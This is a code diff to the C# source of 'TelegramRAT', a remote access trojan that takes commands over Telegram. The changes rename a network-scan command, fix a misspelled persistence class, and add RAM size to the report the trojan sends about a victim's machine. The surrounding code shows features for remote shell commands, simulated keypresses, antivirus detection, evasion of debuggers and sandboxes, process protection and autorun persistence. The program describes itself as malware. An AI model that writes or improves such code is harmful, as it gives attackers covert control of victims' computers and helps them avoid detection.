@@ -103,10 +103,10 @@ namespace TelegramRAT
                             "\n🚀 COMMUNICATION:" +
                             "\n /Speak <text>" +
                             "\n /Shell <command>" +
-                            "\n /MessageBox <error/info/warn> <text> <caption>" +
+                            "\n /MessageBox <error/info/warn> <text>" +
                             "\n /OpenURL <url>" +
                             "\n /SendKeyPress <keys>" +
-                            "\n /ScanNetwork <to>" +
+                            "\n /NetDiscover <to>" +
                             "\n /Uninstall" +
                             "\n" +
                             "\n💣 EVIL:" +
@@ -151,14 +151,14 @@ namespace TelegramRAT
                             "\nSystem time: " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") +
                             "\n" +
                             "\n👾 Protection:" +
-                            "\nInstalled antivirus: " + persistense.DetectAntivirus() +
+                            "\nInstalled antivirus: " + persistence.DetectAntivirus() +
                             "\nStarted as admin: " + utils.IsAdministrator() +
-                            "\nProcess protected: " + config.ProcessProtectionEnabled +
+                            "\nProcess protected: " + (config.ProcessProtectionEnabled && utils.IsAdministrator()) +
                             "\n" +
                             "\n👽 Virtualizaion:" +
-                            "\nDebugger: " + persistense.inDebugger() +
-                            "\nSandboxie: " + persistense.inSandboxie() +
-                            "\nVirtualBox: " + persistense.inVirtualBox() +
+                            "\nDebugger: " + persistence.inDebugger() +
+                            "\nSandboxie: " + persistence.inSandboxie() +
+                            "\nVirtualBox: " + persistence.inVirtualBox() +
                             "\n" +
                             "\n🔭 Software:" +
                             "\n" + utils.GetProgramsList() +
@@ -166,6 +166,7 @@ namespace TelegramRAT
                             "\n📇 Hardware:" +
                             "\nCPU: " + utils.GetCPUName() +
                             "\nGPU: " + utils.GetGPUName() +
+                            "\nRAM: " + utils.GetRamAmount() + "MB" +
                             "\nHWID: " + utils.GetHWID() +
                         "");
                         break;
@@ -1113,7 +1114,7 @@ namespace TelegramRAT
                         break;
                     }
                 // ScanNetwork
-                case "SCANNETWORK":
+                case "NETDISCOVER":
                     {
                         int to;
                         try
@@ -1124,15 +1125,15 @@ namespace TelegramRAT
                         {
                             to = 254;
                         }
-                        utils.WlanScanner(to);
+                        utils.NetDiscover(to);
                         break;
                     }
                 // Uninstall
                 case "UNINSTALL":
                     {
                         telegram.sendText("💉 Uninstalling malware from autorun...");
-                        persistense.unprotectProcess();
-                        persistense.delAutorun();
+                        persistence.unprotectProcess();
+                        persistence.delAutorun();
                         Thread.Sleep(2000);
                         Environment.Exit(0);
                         break;
